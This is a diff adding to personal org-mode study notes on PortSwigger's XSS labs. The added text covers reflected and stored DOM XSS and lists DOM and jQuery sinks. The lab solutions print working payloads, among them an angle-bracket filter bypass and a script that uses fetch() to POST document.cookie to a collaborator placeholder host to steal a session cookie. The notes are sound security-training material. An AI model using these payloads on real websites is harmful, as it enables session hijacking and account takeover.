@@ -672,3 +672,111 @@ To solve this lab, perform a cross-site scripting attack that executes an Angula
 
 - solution:
   this one was hard, I could see that the site was evaluating the expression {{1+1}}, but I then had to use ~$on.constructor('alert(1)')()~ which is something I have to learn to investigate.
+** DOM XSS combined with reflected and stored data
+Some pure DOM-based vulnerabilities are self-contained within a single page. If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side.
+
+However, sources aren't limited to data that is directly exposed by browsers - they can also originate from the website. For example, websites often reflect URL parameters in the HTML response from the server. This is commonly associated with normal XSS, but it can also lead to reflected DOM XSS vulnerabilities.
+
+In a reflected DOM XSS vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+#+begin_src js
+eval('var data = "reflected string"');
+#+end_src js
+
+Websites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.
+
+~element.innerHTML = comment.author~
+*** Lab: Reflected DOM XSS
+PRACTITIONER
+
+LAB
+Solved
+This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
+
+To solve this lab, create an injection that calls the alert() function.
+
+- solution:
+  this lab uses the search function, it encodes nearly all characters except the backslash, I could then use:
+  #
+  #+begin_src html
+  \"-alert(1)}//
+  #+end_src html
+*** Lab: Stored DOM XSS
+PRACTITIONER
+
+LAB
+Solved
+This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.
+
+ACCESS THE LAB
+ Solution
+Post a comment containing the following vector:
+
+<><img src=1 onerror=alert(1)>
+In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.
+** Which sinks can lead to DOM-XSS vulnerabilities?
+The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
+
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
+
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+** Exploiting cross-site scripting vulnerabilities
+The traditional way to prove that you've found a cross-site scripting vulnerability is to create a popup using the alert() function. This isn't because XSS has anything to do with popups; it's simply a way to prove that you can execute arbitrary JavaScript on a given domain. You might notice some people using alert(document.domain). This is a way of making it explicit which domain the JavaScript is executing on.
+
+Sometimes you'll want to go further and prove that an XSS vulnerability is a real threat by providing a full exploit. In this section, we'll explore three of the most popular and powerful ways to exploit an XSS vulnerability.
+
+*** Exploiting cross-site scripting to steal cookies
+Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.
+
+In practice, this approach has some significant limitations:
+
+The victim might not be logged in.
+Many applications hide their cookies from JavaScript using the HttpOnly flag.
+Sessions might be locked to additional factors like the user's IP address.
+The session might time out before you're able to hijack it.
+
+*** Lab: Exploiting cross-site scripting to steal cookies
+PRACTITIONER
+
+LAB
+Solved
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+
+- solution:
+  this lab allowed js to run within a script tag so then I used:
+  #+begin_src js
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+  #+end_src js
+
+  to get the users HTTP request, I could then login using the victims session cookie.
